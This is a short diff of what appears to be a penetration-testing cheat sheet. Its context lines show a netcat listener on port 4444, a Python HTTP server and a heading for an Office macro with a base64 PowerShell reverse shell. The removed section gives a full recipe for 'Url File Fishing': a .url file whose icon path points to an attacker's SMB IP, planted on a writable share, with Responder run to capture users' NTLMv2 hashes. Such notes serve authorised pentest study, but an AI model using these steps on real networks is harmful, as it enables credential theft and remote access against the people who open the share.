@@ -64,19 +64,7 @@ Lhost: nc -nlvp 4444
 Lhost: python3 -m http.server
 ```
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/ddb6330f-410c-4fd5-ad65-0baf3f7e9a96)
-### Url File Fishing
-```
-1. Create file called "@hax.url" with following content:
-[InternetShortcut]
-URL=anything
-WorkingDirectory=anything
-IconFile=\\192.168.45.188(kali ip)\%USERNAME%.icon
-IconIndex=1
 
-2. if SMB share has write permission, upload @hax.url onto smb share
-3. sudo responder -I tun0 -Av
-Then you get ntlmv2 hash
-```
 ### Office Macro Using Powershell base64 encoded reverse shell
 1. Original Powershell Payload
 ```
